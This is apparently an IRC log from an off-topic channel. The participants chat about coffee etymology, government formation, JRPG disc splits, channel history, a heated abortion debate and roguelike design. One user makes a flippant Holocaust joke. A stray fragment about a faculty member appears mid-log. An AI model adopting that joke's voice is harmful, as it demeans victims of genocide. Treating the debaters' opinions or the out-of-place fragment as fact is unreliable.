May 11 11:17:47 <shikhin>	nortti: I haven't completely thought about where I'll be using it, but e.g. using it as a set of points.
May 11 11:18:18 <shikhin>	Maybe I ought to do all the n^2 comparisons and determine the set that way. But only if it's a real issue––is it? I don't know.
May 11 11:18:28 <shikhin>	And I don't want to *gasp*write code*gasp* to find out.

May 11 11:35:00 <vehk>	So might be hard to find online, but I'll look into it
May 11 11:35:03 <FireFly>	I like teaching things to the extent that I can, though? so I guess that counts
May 11 11:35:17 <FireFly>	It wasn't all that far off, to be perfectly honest
May 11 11:35:18 <shikhin>	vehk: Ah. No worries. I'll look into what he's written on it as well.

May 11 11:37:56 <FireFly>	this week's @sweden is suggesting fika tomorrow at a cafe in Stockholm, I'm mildly tempted to go

May 11 11:38:45 <shikhin>	"The word "fika" is an example of the back slang used in the 19th century, in which syllables of a word were reversed, deriving fika from kaffi, an earlier variant of the Swedish word kaffe ("coffee")."
May 11 11:38:55 <FireFly>	shikhin: like, buns and cookies and coffee/tea/saft
May 11 11:39:12 <FireFly>	oh yeah, fika has a fun etymology
May 11 11:39:14 <FireFly>	forgot about that
May 11 11:39:43 <shikhin>	Apparently a phenomenon in 19th century Swedish? Sounds cool.
May 11 11:39:57 <shikhin>	"Back slang is thought to have originated in Victorian England, being used mainly by market sellers, such as butchers and greengrocers, to have private conversations behind their customers' backs and pass off lower quality goods to less observant customers."
May 11 11:40:18 <FireFly>	I don't know of any other word derived that way in swedish
May 11 11:40:25 <FireFly>	or well, can't think of any other at least

May 11 11:41:02 <FireFly>	aw
May 11 11:42:06 <shikhin>	"The ban on coffee was finally lifted in 1823, which coincided with the social trend in Sweden to use back slang, or the inversion of syllables in words, so kaffi became fika."
May 11 11:42:24 <nortti>	wait, ban on coffee?
May 11 11:43:17 <john_cephalopoda>	Oh, interesting. Back slang was mentioned in my french book as "youth language", where "bus" would become "sebuse" and "taxi" would become "xita"

May 11 11:59:54 <nortti>	reminds me of the time some ancaps pointed to the period when belgium had no govt. and how the bigger growth in economy there compared to neighbouring countries (iirc) mean that ancapism is of corse the true economic system. then someone pointed out that because of the lack of govt, they'd actually gotten austerity a couple years after other places, and so the growth was likely due to public spending
May 11 12:00:37 <shikhin>	Heh.

May 11 12:15:27 <CompanionCube>	nortti: also said ancaps must've failed to recognise the difference between 'no govt' and 'no state'
May 11 12:16:22 <nortti>	you can pretty much replace the things in quotes there with anything anarchism-related and it'd hold tbh
May 11 12:17:44 <shikhin>	This is the recent Belgium can't-form-a-government thing (which I just learned about)? In that case, didn't they have some sort of a provisional government anyway?
May 11 12:18:02 <nortti>	this is the one from a few years back
May 11 12:18:09 <shikhin>	Right, er, what I meant.
May 11 12:18:33 <nortti>	oh, I was honestly willing to accept they're having trouble forming govt. again
May 11 12:18:39 <shikhin>	Haha.
May 11 12:18:41 <CompanionCube>	shikhin: under parliamentary systems there is always a government
May 11 12:18:55 <CompanionCube>	even if it's just the previous government acting as caretakers
May 11 12:19:04 <shikhin>	Right.

May 11 12:22:20 <CompanionCube>	shikhin: well, one conventional response to a deadlock is to dissolve all the things and call new elections
May 11 12:22:32 <shikhin>	Right, that's what I think should happen in India?
May 11 12:24:38 <john_cephalopoda>	Another conventional response is to allow the chancellor to make laws by himself and then kill 6 million jews.
May 11 12:25:21 <john_cephalopoda>	Germany took 6 months to form a government this election.
May 11 12:25:47 <nortti>	I guess godwin's law is still alive and well

One faculty member protested: "What will our soldiers think when they return to the university and find that they

May 12 02:02:50 <asecretcat-web>	nortti: nah, most JRPGs didn't really have a kind of chapter structure in such a way before then. there were a few exceptions tho, like terranigma had chapters that were clearly delineated, while chrono trigger had chapters but, you only knew you were in a certain one from your save slot. illusion of gaia didn't really have... "chapters" per se, but rather as the game progressed you moved to specific sections of the world map
May 12 02:03:28 <nortti>	mh
May 12 02:04:40 <nortti>	was thinking of how in ff6 there was the world of ruin, and in ff4 the light world, dark world, combined world (iirc), but I guess that was just those games
May 12 02:04:49 <asecretcat-web>	mostly i think for PSX+ JRPGs that used multiple CDs it was probably a combination of style and practicality.  i forget where ff7 split up, but in xenogears for example disc 2 was rather infamous, because it was...somewhat like transitioning into an entirely different kind of JRPG.  there was no world map in disc 2, the story was very linear, and a lot of the story was told to you more like a visual novel than a JRPG.
May 12 02:05:02 <nortti>	right
May 12 02:05:53 <asecretcat-web>	ff6 is probably a better example of a SNES one that had that wildly different second part yeah
May 12 02:05:58 <nortti>	in ff7 disk 1 ends with your first visit to the city of ancients and pretty sure disk 2 ends with the section where you return to midgar
May 12 02:09:05 <asecretcat-web>	yeah i guess like, for each game the designers probably chose specific points that would look like a good segueway into the next disc, and tried to make it feel as natural as possible.
May 12 02:09:31 <asecretcat-web>	for ff9 i kind of remember now a transition when you witness a certain city get destroyed.
May 12 02:10:10 <nortti>	mh
May 12 02:10:50 <asecretcat-web>	it's somewhat amazing that they were able to keep enough of an accessible game world in each disc, such that you wouldn't need to switch discs constantly if you wanted to reenter old areas.
May 12 02:11:24 <asecretcat-web>	which makes me wonder now how sequence breaking works when you have to work around multiple discs...
May 12 02:12:55 <nortti>	hm, that is an interesting question
May 12 02:13:19 <nortti>	also, I remember hearing that in ff8 once you enter the final disk some areas of world become inaccessible

May 12 02:18:01 <asecretcat-web>	yep unfortunately
May 12 02:19:51 <asecretcat-web>	actually i think i'm partially wrong for xenogears disc 2.  i think there was a world map, but you never got to actually access it for most of the disc.

May 12 03:26:29 <shikhin>	Why choose one way for y and one way for g?
May 12 03:27:27 <FireFly>	because I could excuse it for y (and almost for p, q) but not for g)

May 12 04:13:15 <nortti>	what brings you here?
May 12 04:13:55 <SGautam>	i found this when i was stalking sorti- exploring sortix webpages
May 12 04:14:38 <sortie>	Hi SGautam
May 12 04:14:53 <SGautam>	hello
May 12 04:16:41 <nortti>	any particular reason this chan caught your eye?
May 12 04:19:54 <SGautam>	well, the first result on Google regarding offtopia is a 2B2T Wikia fanpage saying, "Offtopia is a well known and respected oldfag on the server. He has been playing on 2b2t since the Facepunch Era way back in 2011-2012."
May 12 04:20:19 *	sortie blinks
May 12 04:20:38 <SGautam>	what's this place exactly
May 12 04:20:42 <nortti>	okay, that is not us
May 12 04:21:46 <nortti>	this was originally a spinoff offtopic channel from #osdev (and even before that, a joke), but we've drifted apart quite strongly in the couple last years (including moving the channel to get rid of #osdev- prefix)
May 12 04:22:22 <nortti>	nowadays this place is just its own thing and a social channel for people in here or people the people in here know
May 12 04:22:37 <SGautam>	oh i remember messaging you i think, regarding #osdev-offtopic
May 12 04:22:46 <SGautam>	did you get the message?
May 12 04:22:49 <nortti>	ooh, right, that was you
May 12 04:23:00 <nortti>	yea, I did, but you had quit by that point
May 12 04:25:57 <SGautam>	well i speak a lot of offtopic stuff in #osdev because the community is nice, so i was thinking maybe have #osdev-offtopic for actual offtopic stuff. i don't know whether it'll be adopted by the people there or not, for example, #ubuntu and ##physics have their offtopic channels endorsed for OT discussion.
May 12 04:28:18 <nortti>	honestly, if you want to run such a channel, I'd be fine with giving you the chanserv rights there
May 12 04:28:48 <nortti>	do you?
May 12 04:30:22 <SGautam>	hm, not rn
May 12 04:30:46 <SGautam>	this place is full of 1984 references
May 12 04:30:51 <nortti>	indeed
May 12 04:31:41 <sortie>	nortti: If you're going to hand over #osdev-offtopic to anyone, probably should be me so I can manage it as as an operator in #osdev
May 12 04:31:50 <sortie>	Not that I want that to happen
May 12 04:32:33 <nortti>	sure
May 12 04:32:55 <nortti>	just doesn't seem like the ops of #osdev have interest in that place
May 12 04:33:07 <sortie>	But that's, uh, me
May 12 04:33:22 <nortti>	wait, you're the only op there?
May 12 04:33:30 <sortie>	Well a couple other busy people as well
May 12 04:33:34 <nortti>	mh
May 12 04:33:51 <nortti>	anyways, don't you already have full chanserv access there?
May 12 04:34:00 <sortie>	Yeah sure
May 12 04:34:13 <sortie>	#osdev isn't that offtopic, the bit of offtopic stuff there works
May 12 04:34:17 <nortti>	mh
May 12 04:34:41 <sortie>	Maybe I should start up #osdev-offtopic again and invite the most toxic people I can find and then watch their horror as they some day discover what came before
May 12 04:34:48 <nortti>	:D:
May 12 04:35:03 <nortti>	(fwiw, if it came to handing over #osdev-offtopic, I would want to get a consensus on the inner party chan)

May 12 04:36:14 <SGautam>	so.. is there enforcement?
May 12 04:36:30 <nortti>	yes, but only for laws that are considered [core]
May 12 04:37:08 <nortti>	basically, laws that were actual proposals, and not just random lines people thought funny
May 12 04:37:38 <john_cephalopoda>	We could invite toxic people to #osdev-offtopic and make everybody op.

May 12 04:47:29 <nortti>	< SGautam> not really sure how this tech persisted even with all the new stuff coming up ← I would guess it's a combination of "being there first", being without any kind of centralized servers run by a company or even standard clients/servers with everything else being a second-class citizen, and attachment many people have to the tech

May 12 13:30:28 <nortti>	…I honestly would not be surprised, actually?
May 12 13:30:32 <vehk>	Yeah, same
May 12 13:30:38 *	shikhin decrees that no one use the pro-choice / pro-life euphemisms in here.
May 12 13:30:54 <nortti>	what should we call them, then?
May 12 13:31:17 <hydraz>	"murderers" and "decent people", respectively /me ducks
May 12 13:31:31 <nanovad>	oh no, my good Christian worldview
May 12 13:31:33 <shikhin>	pro-abortion / anti-abortion? Or pro-choice / anti-choice? When both sound so positive, it's hard for me to figure out which refers to what.
May 12 13:31:38 *	john_cephalopoda . o O ( "The DNA of the baby must be free as in free speech, following the 3 essential freedoms." )
May 12 13:31:48 <nanovad>	pro-choice/anti-choice has some odd connotations to me
May 12 13:31:53 <nortti>	oh?
May 12 13:32:01 <vehk>	Mmh, I think shikhin has a point.
May 12 13:32:04 <shikhin>	Right, I can see that––but pro-abortion / anti-abortion sounds neutral to me.
May 12 13:32:10 <vehk>	well, the connotation that the woman does not have a choice... which is true?
May 12 13:32:18 <shikhin>	*nod*
May 12 13:32:42 <nanovad>	that is, "anti-choice" makes me think that you don't want the woman to have a choice (implying beyond abortion?) 
May 12 13:32:47 <nortti>	shikhin: that doesn't quite get the issue, tho. it's not like pro-choice people think that abortions, in general, are good
May 12 13:33:18 <shikhin>	nortti: pro-choice / anti-abortion?
May 12 13:33:22 <nortti>	mh
May 12 13:33:23 <nortti>	nanovad: which, funnily enough, ~always does go with that stance
May 12 13:33:25 <john_cephalopoda>	Choice doesn't exist anyway. We are all guided by our great lord!
May 12 13:33:33 <shikhin>	There's lots of choices, but I'm very certain that pro-choice / pro-life is not a good one.
May 12 13:33:37 <nanovad>	nortti: guess I'm an outlier there then
May 12 13:33:46 <shikhin>	You're against abortion?
May 12 13:33:49 *	nanovad nods
May 12 13:33:58 <nortti>	why?
May 12 13:34:03 <hydraz>	always?
May 12 13:34:06 <nanovad>	always
May 12 13:34:09 <shikhin>	(Was thinking if I wanted to ask why or not.)
May 12 13:35:13 <nanovad>	As to why, it's basically this: once a woman is impregnated, the cells that result are not their mother's DNA anymore. They're something new entirely, a different person (even as a clump of cells). As such, they should have the same rights that apply to everyone else
May 12 13:35:39 <hydraz>	I guess our definition of person differs, then
May 12 13:35:54 <shikhin>	The person loses their right to bodily integrity, though?
May 12 13:35:56 <hydraz>	a clump of cells without any conscience ∉ people
May 12 13:36:08 <nortti>	nanovad: there is a great violinist whose kidneys are failing and who cannot use a dialysis machine. the lovers of violin music kidnap you and attach you to him, since you are close enough match with him biologically. if you disconnect yourself from said person, the violinist will die. do you have a right to get yourself out of that situation?
May 12 13:36:23 <nanovad>	hydraz: So babies aren't people until they're, what, 6+? Can we kill toddlers, then?
May 12 13:36:42 <hydraz>	not conscience, sentience
May 12 13:36:46 <hydraz>	they're the same word in portuguese
May 12 13:36:49 <nanovad>	ah, gotcha
May 12 13:36:54 <hydraz>	apologies
May 12 13:37:25 <john_cephalopoda>	nanovad: What if there is a complications and the mother (and subsequently the unborn child) will both die if no abortion is performed?
May 12 13:37:35 <nanovad>	nortti: pondering
May 12 13:38:12 <nanovad>	john_cephalopoda: Path of least damage, i.e. try to save the one with the greatest chance for survival, even if that includes an abortion/'killing' the mother.,
May 12 13:38:25 <nortti>	even in cases of rape?

May 12 13:38:50 <john_cephalopoda>	nanovad: So that means you are _for_ abortion if there is danger to the mother's life.
May 12 13:39:20 <nanovad>	Suppose so, but that's a fairly exceptional circumstance
May 12 13:39:29 <john_cephalopoda>	It's a common circumstance.
May 12 13:39:41 <shikhin>	The case of rape is very similar to nortti's hypothetical violin situation… the fact that you're so sure about one but not about another, hmm.
May 12 13:39:44 <john_cephalopoda>	Pregnancy is quite delicate.
May 12 13:39:48 <nortti>	actually one of the big reasons why late-term abortions are performed
May 12 13:39:50 <nanovad>	shikhin: Yeah, I'm working on that
May 12 13:40:01 <sortie>	https://www.ibm.com/us-en/marketplace/aix seems actually to work
May 12 13:40:01 <nortti>	would say main reason, but do not have the data
May 12 13:40:01 <bslsk05>	​www.ibm.com: IBM AIX Standard Edition - Overview - United States
May 12 13:40:22 <shikhin>	Just sayin', if you're unsure about nortti's scenario, you should be unsure about what the right thing to do with an abortion in cases of rape is.
May 12 13:40:23 <CompanionCube>	sortie: I've heard AIX as been described as 'UNIX...by aliens'
May 12 13:40:26 <nanovad>	nortti: I'd have to say no, now that you're responsible for the violinist's life, it doesn't matter how you got there

May 12 13:42:53 <nanovad>	nortti: Also, if the violinist kills me, then he dies too.

May 12 13:43:25 <nanovad>	john_cephalopoda: eh, I don't see how disability factors in. She can carry the child and put it up for adoption, put it in a care facility, etc.

May 12 13:46:37 <hydraz>	CURSES
May 12 13:46:59 <nortti>	nanovad: so, your stance is that as long as you have the lesser chance of dying, you are morally responsible for any human life / possibility of a human life that is dependant on you, even if you might not have had any choice in it and would have gone through reasonable precautions to avoid the situations
May 12 13:47:01 <nanovad>	vehk: eh, depends on how it works? If it's preventing fertilization itself, then yeah. Condoms, etc, I don't see a problem with
May 12 13:47:04 <nortti>	+?
May 12 13:47:24 <vehk>	nanovad: Oh, so no vasectomy, for example?
May 12 13:47:29 <vehk>	Or does it just apply to women?
May 12 13:47:41 <shikhin>	nanovad: W-why is there a difference between preventing fertilization and condoms?
May 12 13:47:47 <nanovad>	That's just physically preventing fertilization, yeah? I don't see a problem with that either
May 12 13:47:52 <nanovad>	shikhin: was saying as a means to an end
May 12 13:47:53 *	shikhin blinks.
May 12 13:48:08 <shikhin>	What do you mean by "preventing fertilization", then?
May 12 13:48:15 <nortti>	shikhin: he is okay with both
May 12 13:48:15 <john_cephalopoda>	nanovad: If that "become more difficult" is "you'll have to spend all your money on the child because it needs expensive medicine, you become homeless and die in a cold winter on the street", then probably?

May 12 13:48:55 <nanovad>	john_cephalopoda: eh, understandable. I guess that's a difference of opinion though, I don't think murder is justifiable except in self-defense
May 12 13:49:01 <nanovad>	and then there's proportional response and all that
May 12 13:49:04 <shikhin>	(No one's talking about murdering a child, but okay.)
May 12 13:49:12 <vehk>	I could honestly read abortion as self-defense in a way.
May 12 13:49:18 <nanovad>	yeah, me too
May 12 13:49:46 <john_cephalopoda>	nanovad: I know people who say that killing Nazis is self-defense because Nazis say bad things and that's vocal violence :þ
May 12 13:49:49 <nanovad>	shikhin: I had given john_cephalopoda a hypothetical, perhaps you missed it?
May 12 13:49:49 <CompanionCube>	sortie: imo IBM's more interesting OS is i

May 12 13:51:17 <hydraz>	Definitely.
May 12 13:51:44 <vehk>	Implies that baby Hitler is unchangeably evil
May 12 13:51:45 <nanovad>	good of the many *shrug* I'd kill Hitler as a small child even, if I knew what he'd do
May 12 13:52:34 <nanovad>	vehk: I think we've made it back to predestination
May 12 13:52:35 *	CompanionCube would do it as long as there was evidence that this wouldn't fuck up things even more
May 12 13:52:43 <vehk>	nanovad: hm, yes
May 12 13:52:49 <hydraz>	vehk: Duh, he's literally Hitler.
May 12 13:53:05 *	nanovad . o O ( Hitler was born with his stache )
May 12 13:53:38 <vehk>	nanovad: So am I correct in thinking that abortionwise you take a stance of everyone's right to life?
May 12 13:53:42 <nortti>	nanovad: out of interest, how about a situation where an alien organism attaches onto you. at the moment, it is not conscious and indistinguishable from sth like a fish, but over time it might develop sentience. it is modifying your body to be a suitable host for you in a really invasive procedure that is easily leathal without modern healthcare. is it morally wrong to detach it from you?

May 12 13:56:19 <hydraz>	nanovad: Have you seen natural selection? It's about making as many as possible because half are broken and another quarter get eaten
May 12 13:56:23 <nanovad>	I also have an issue with "modern healthcare", not sure that applies. Humans generally have modern healthcare, and it usually requires such for abortion too
May 12 13:56:35 <shikhin>	"Humans generally have modern healthcare" – *blink*
May 12 13:56:44 <shikhin>	That isn't even true in this country, let alone the rest of the world.
May 12 13:57:11 <nortti>	nanovad: right, I am not saying you don't have it. I'm just giving the scope of the danger posed by the modification it will do on its host
May 12 13:57:33 <shikhin>	(They don't have good access to abortion facilities too, so… yes, they they do require access to modern healthcare for abortion, but they need to struggle to obtain that.)
May 12 13:57:43 <nanovad>	nortti: hm, in that case, I'd still go with "better chance of survival". I guess that'd mean the host in that case
May 12 13:58:03 <nanovad>	<vehk> nanovad: So am I correct in thinking that abortionwise you take a stance of everyone's right to life? ← forgot to answer this -- yes
May 12 13:58:14 <vehk>	Does that only apply to human beings or also animals?
May 12 13:58:26 <nanovad>	Animals, too.
May 12 13:58:34 <vehk>	Is it moral to kill animals for food?
May 12 13:58:36 <nortti>	are you a vegan?
May 12 13:58:50 <nanovad>	vehk: yep
May 12 13:58:53 <shikhin>	…
May 12 13:59:01 <hydraz>	...
May 12 13:59:03 <vehk>	Do explain, because to me that does not follow.
May 12 13:59:42 <nortti>	nanovad: fwiw, the situation I have described is more or less analoguous with pregnancy
May 12 13:59:48 <nanovad>	vehk: Killing for food isn't on the same level as an animal abortion if the abortion isn't necessary. Killing for food is a necessary evil
May 12 13:59:51 <nanovad>	nortti: yeah, I noticed
May 12 14:00:11 <vehk>	I'd argue that killing for food is less of a necessary evil than abortion.
May 12 14:00:17 <nanovad>	How so?
May 12 14:00:26 <nortti>	so, why do you feel the host is more likely in danger in my situation than in a normal human pregnancy?
May 12 14:00:37 <vehk>	You don't need to kill for food at all, ie you don't have to eat meat to survive.
May 12 14:01:37 <nanovad>	nortti: eh, I think statistically pregnancies aren't all that dangerous
May 12 14:02:25 <nanovad>	Trying to find data on that though
May 12 14:02:30 <shikhin>	"every day 830 women die from pregnancy or childbirth related causes"
May 12 14:02:40 <shikhin>	(https://en.wikipedia.org/wiki/Maternal_death. Second paragraph.)
May 12 14:02:40 <bslsk05>	​en.wikipedia.org: Maternal death - Wikipedia
May 12 14:02:42 <nanovad>	shikhin: out of how many pregnancies?
May 12 14:03:11 *	shikhin blinks.
May 12 14:04:23 <shikhin>	Let's see.
May 12 14:04:25 <nanovad>	Here's a fun implication, though
May 12 14:04:59 <nanovad>	If pregnancy is so dangerous, would it be wrong if everyone decided to constantly have abortions and humans went extinct?
May 12 14:05:06 <nortti>	nope
May 12 14:05:14 <nanovad>	Curious on that one, I'm leaning towards no
May 12 14:05:25 <nortti>	nanovad: https://www.unfpa.org/data/world-population-dashboard says 216 deaths per 100,000 births
May 12 14:05:25 <nanovad>	I don't see an obligation to reproduce and that falls under that
May 12 14:05:26 <bslsk05>	​www.unfpa.org: World Population Dashboard | UNFPA - United Nations Population Fund
May 12 14:05:43 <nanovad>	so 0.2% chance of death 
May 12 14:05:47 <nanovad>	Roughly.
May 12 14:05:52 <nortti>	right
May 12 14:06:11 <nanovad>	So, 100% chance of death of the fetus vs 0.2% chance of death of the mother (and likely fetus)
May 12 14:06:50 <nanovad>	Best chance of survival for all parties involved is not having an abortion, ergo, abortions are bad, as I see it
May 12 14:08:20 <nortti>	anyways, would like to see your reasoning why killing for food is justified
May 12 14:09:20 <nortti>	also, on the connected but not the same question as whether abortion is right, should women have access to safe medical abortion?
May 12 14:09:23 <shikhin>	You can see how one would think this is just you trying to restrict choices for women, when you put limitations on them that risks their life but continue being immoral even though there's no risk to you (e.g. eating meat)…
May 12 14:09:55 <nortti>	or, well, anyone who is carrying a fetush
May 12 14:10:05 <shikhin>	Right.
May 12 14:10:06 <nanovad>	<nortti> also, on the connected but not the same question as whether abortion is right, should women have access to safe medical abortion? ← I don't think so, no
May 12 14:10:30 <vehk>	So women who really don't want a baby should risk unsafe abortions?
May 12 14:10:46 <nortti>	abortions and induced miscarriages are going to still happen, and now they're going to be dangerous for the woman as well
May 12 14:11:13 <shikhin>	Well.
May 12 14:11:14 <nanovad>	nortti: dirty equipment (thinking needles for heroin) is a common cause of death for drug users. Should we sell clean crack pipes?
May 12 14:11:20 <nortti>	yes
May 12 14:11:20 <vehk>	Yes
May 12 14:11:21 <nanovad>	Or, hell, give them away?
May 12 14:11:23 <nanovad>	jesus what
May 12 14:11:23 <nortti>	yes
May 12 14:11:24 <vehk>	Yes
May 12 14:11:32 <nortti>	portugal does that
May 12 14:11:44 <nortti>	got rid of much of their drug problems
May 12 14:12:10 <shikhin>	On the other hand, if I think something is immoral, I would want to work best towards avoiding it and not doing it safely? I can see nanovad's point here…
May 12 14:12:18 <shikhin>	Doesn't apply to the drugs case because nothing about morality there.
May 12 14:12:19 <hydraz>	nanovad: people can't legally do X, so instead they get AIDS X instead (literally, sometimes)
May 12 14:12:41 <vehk>	shikhin: The thing I don't understand is that you decide *for other people*
May 12 14:12:43 <shikhin>	But if I think murdering people is immoral, I won't say let's give murderers access to clean weapons so the murder happens easily.
May 12 14:12:48 <vehk>	Since the abortion thing will be controlled statewise
May 12 14:13:03 <vehk>	Why do you care whether some girl is mory happy having an abortion?
May 12 14:13:17 <shikhin>	vehk: Because to me it's equivalent to murder?
May 12 14:13:24 <shikhin>	(For no good reason.)
May 12 14:13:32 <shikhin>	(i.e. not self defense.)
May 12 14:13:57 <vehk>	Then I'd call into question why it's equivalent to murder, I guess
May 12 14:14:07 <nanovad>	I think I already defined why earlier, at least fo rme
May 12 14:14:08 <vehk>	I mean we have talked about self-defense as well
May 12 14:14:23 <shikhin>	Right, I'm fine with that. Just saying that if we accept everything so far, then nanovad's current statement (not the crack pipes bit, though) makes sense.
May 12 14:15:35 <nortti>	nanovad: would killing someone (let's say there is absolutely no other way around it) to stop them from raping you be under self-defence?
May 12 14:15:37 <nanovad>	heads up, I have to leave in 10 minutes, not trying to bail on the discussion
May 12 14:15:43 <vehk>	shikhin: *nod*
May 12 14:15:44 <nortti>	*justified self-defence
May 12 14:16:13 <nortti>	or kidnapping
May 12 14:16:14 <nanovad>	nortti: hmmm, I'm not sure how I'd draw the line for justification on that. Obviously I think rape is a very serious crime, but I don't know if it's on the same level as murder
May 12 14:16:37 <nanovad>	At least personally I don't think I'd feel very guilty if I killed someone who was definitely going to rape/kidnap me
May 12 14:16:51 <nortti>	why?
May 12 14:17:05 <nanovad>	Not sure, honestly
May 12 14:17:20 <nortti>	you are unlikely to die in either, but if you kill that person, one person is going to die
May 12 14:17:38 <nanovad>	right, I guess it's too black/white. Doesn't take into account any lasting trauma
May 12 14:17:56 <shikhin>	(See pregnancies.)
May 12 14:17:59 <nanovad>	vehk: eh, I've been thinking about the animal thing. I guess animals don't have a right to life? (saying that sounds weird, I mean they don't have the same rights as humans)
May 12 14:18:17 <nanovad>	shikhin: hm, are you referring to postpartum depression, future health complications, and the like?
May 12 14:18:22 <nortti>	re. shikhin's point, especially pregnancies that come from rape
May 12 14:18:47 <nanovad>	nortti: ah, may have figured it out. The rapist/kidnapper is not innocent, the fetus is
May 12 14:18:48 <nortti>	those can easily fuck you up mentally, if you are forced to carry them to term
May 12 14:19:10 <shikhin>	nanovad: Sure.
May 12 14:19:43 <nortti>	nanovad: how do you define innocense in case of a being that isn't sentient?
May 12 14:20:11 <nanovad>	nortti: if it's not sentient, it can't do anything wrong, therefore it's innocent?
May 12 14:20:40 <nortti>	I'm arguing that applying terms like "innocent" to non-sentient objects is a category error
May 12 14:20:47 <shikhin>	That sounds like one of those arguments that end with "And so god exists."
May 12 14:20:50 <nanovad>	I'm not very well schooled philosophically, so… yeah, I was just thinking ^ might be a problem
May 12 14:21:10 <nanovad>	nortti: perhaps innocuous is a better word
May 12 14:21:41 <nortti>	also, re. your point about innocense, I guess under your system the right to live isn't so strongly afforded to everyone?
May 12 14:21:57 <nortti>	*equally strongly
May 12 14:22:16 <nanovad>	The way I'd put it is "Everyone has the same right to live, but it's justifiable to strip that right in certain cases". I honestly haven't thought about that part a lot
May 12 14:22:37 <shikhin>	nanovad: Do you see yourself changing your mind about abortions?
May 12 14:22:41 <vehk>	nanovad: Say abortion would carry a prison sentence. You abort your rapist's child, the rapist gets caught. Will you get a longer prison sentence than the rapist because you are a murderer?
May 12 14:22:49 <hydraz>	Everyone has the same right to live, but some have more right to live than others.
May 12 14:22:53 <shikhin>	+ever
May 12 14:23:18 <nortti>	(anyways, gonna head to bed now)

May 12 14:23:30 <shikhin>	nortti: niht
May 12 14:23:34 <nanovad>	shikhin: possibly, I'd never consider my opinions set in stone. Don't know what would change them, but…

May 12 14:23:49 <shikhin>	nanovad: Ah, good.
May 12 14:23:59 <nanovad>	vehk: Mm, yes
May 12 14:24:00 <vehk>	Anyway, back to my original point. RMS is a douche.
May 12 14:24:05 <nanovad>	haha
May 12 14:24:11 *	nanovad concurs
May 12 14:24:24 <olsner>	pretty sure that part was never under debate
May 12 14:24:39 <vehk>	nanovad: I have to say, your points are consistens, but boy do I not agree with them.
May 12 14:24:47 <vehk>	Add spelllung

May 12 14:26:33 <vehk>	hydraz: Of course for some reason that made me think about vas deferens, bah
May 12 14:27:25 <shikhin>	Dunno; I didn't see much consistency in dealing with the whole killing of animals thing. At one point you were arguing that they do have an equal right to life and you only kill them because it's necessary… but when that didn't pan out for you, you relaxed their right to life.
May 12 14:27:38 <vehk>	Right, I was talking about the abortion thing exclusively
May 12 14:28:07 <shikhin>	If you can't be as sure about that, why would you be sure that fetuses have an equal right to life––and if you aren't, why would you advocate legal restrictions that harm people we are sure have an equal status as us.
May 12 14:28:11 <nanovad>	shikhin: that was a pretty naive thought, just "they're alive so they have a right to be so", but it doesn't make sense, so…
May 12 14:28:31 *	vehk wonders how human beings are special
May 12 14:28:48 <shikhin>	I don't see a giraffe writing the constitution, vehk.

May 12 14:29:24 <vehk>	shikhin: But giraffes are definitely cuter than Jefferson
May 12 14:29:33 <hydraz>	actually, have you seen George Washington?
May 12 14:29:41 <hydraz>	That is a freakishly long neck.
May 12 14:29:45 <nanovad>	shikhin: Would you say the ability to move around and not be imprisoned is a human right?
May 12 14:29:49 <shikhin>	Are you saying he's cute or are you--ah, you're saying he's a giraffe.

May 12 16:20:12 <vehk>	Well, I'd be right with you there
May 12 16:20:22 <vehk>	The way I phrased it earlier was poking fun at it anyway
May 12 16:20:25 <emily>	have you played Sil?
May 12 16:20:50 <vehk>	Nope, haven't. This is mainly research for a project, so basically anything goes.
May 12 16:20:59 <vehk>	I've played loads of lites, not many likes
May 12 16:21:13 <emily>	Sil is one of the best-designed roguelikes, IMO.
May 12 16:21:22 <vehk>	Thanks, will look into that
May 12 16:21:32 <emily>	Crawl (as in DCSS) is a classic, even if it has its flaws once you play it enough
May 12 16:21:43 *	FireFly wikipedias the Berlin interpretation
May 12 16:22:02 <emily>	I mean, if you want a "classic" recommendation then you'd include NetHack. but NetHack fucking sucks, so, like, it depends on whether you want *recommendations* or classics
May 12 16:23:25 <vehk>	I'm mainly interested in how roguelikes are designed, and why they work (or don't work)
May 12 16:23:37 <vehk>	And how elements of likes relate to elements in lites, how those are designed, etc etc
May 12 16:23:48 <vehk>	Basically I just want to cover ground with likes, since I have not played many
May 12 16:23:57 <emily>	sure
May 12 16:24:07 <emily>	roguelike design is a very interesting topic
May 12 16:24:11 <emily>	there are many philosophies
May 12 16:25:09 *	asecretcat-web thinks about persona 3 and 4 and how they had randomly-generated dungeons
May 12 16:25:18 <emily>	I have things to say / things to link you on it, but allow me to for now at least link just http://nethack4.org/blog/strategy-headroom.html. I disagree with ais523 on many things about roguelike design -- perhaps most -- and I don't fully accept the model this blog post describes. but it is still a modern classic in terms of written stuff about roguelike design
May 12 16:25:18 <bslsk05>	​nethack4.org: Strategy headroom in roguelikes
May 12 16:25:31 <asecretcat-web>	they're not exactly roguelikes but, the idea is reminiscent

May 12 16:25:42 <vehk>	Thanks
May 12 16:26:16 <shikhin>	Is it okay if I can make /no/ sense of what's being discussed right now?
May 12 16:26:22 <vehk>	Yes
May 12 16:26:27 <asecretcat-web>	perfectly okay :p
May 12 16:26:28 <emily>	vehk: oh, and I actually class Crypt of the Necrodancer as a roguelike rather than a -lite (Bard, having no realtime element, is uncontroversially a roguelike qua roguelike. But I count the rest as -like too; it hews *so* closely apart from the rhythm element that I can't classify it -lite)
May 12 16:26:31 <shikhin>	Phew.
May 12 16:26:58 <emily>	I certainly think Necrodancer is one of the best, most fun, and most well-designed of the roguelike category, it's unequivocally a classic imo.
May 12 16:27:45 <emily>	it shows admiral restraint that it didn't need to -- it could easily compromise on the format more, or get more complex in ways that would be fairly harmless to the gameplay experience, but it doesn't.

May 12 16:28:55 <vehk>	emily: Mh, yeah, I do agree.
May 12 16:29:08 <vehk>	Necrodancer was one of the ones I was going to focus more on
May 12 16:29:25 <emily>	vehk: (I really want to design more roguelikes, some day! it's a passion project for me, I guess. but although I would consider myself knowledgable about roguelike design, *producing* designs that fit together is a far harder task, done more often by accident than with intention. there's a reason roguelikes involve so much forking or mimicking and so few clean breaks)
May 12 16:30:06 <emily>	vehk: oh, brogue is also a quite good recent roguelike that was influential / constituted a break from the designs of the time
May 12 16:30:52 <vehk>	Right. I don't yet know what I want with this research, but since I do want to design a game, or at least learn more about game design, I set out to just deconstruct some games, and happened to start with roguelikes
May 12 16:31:18 <vehk>	So in a sense I want to find out what the core is of roguelikes that work and are fun, and in what sense you can build a more varied game around it
May 12 16:31:36 <john_cephalopoda>	Roguelikes are quick fun.
May 12 16:31:50 <vehk>	(tbh, roguelikes was only because ybden and I got into a discussion [again] on how horrible Binding of Isaac was as a roguelite [pains me to categorize it as that even])
